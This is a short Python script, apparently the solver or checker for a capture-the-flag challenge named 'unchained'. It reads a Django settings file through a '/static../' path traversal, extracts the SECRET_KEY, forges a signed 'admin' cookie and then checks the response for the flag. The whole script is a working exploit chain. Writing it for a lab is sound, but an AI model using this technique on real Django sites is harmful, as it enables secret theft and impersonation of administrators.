#!/usr/bin/env python3
import requests
import os
import re
from django.core import signing


if os.getenv("DEV"):
    url = "http://localhost:8000"
else:
    url = "https://unchained.ctf.insecurity-insa.fr"
auth = ("insecurity", "fake_preprod_password")

r = requests.get(url + "/static../unchained/settings.py", auth=auth)
secret_key = re.findall(r"SECRET_KEY = '(.*)'", r.text)[0]

admin_cookie = signing.dumps("admin", key=secret_key)

r = requests.get(url, cookies={
    "username": admin_cookie
}, auth=auth)
flag = re.findall(r'INSA{.*}', open('../.mkctf.yml').read())[0]
if flag in r.text:
    exit(0)
else:
    print(r.text)
    exit(1)

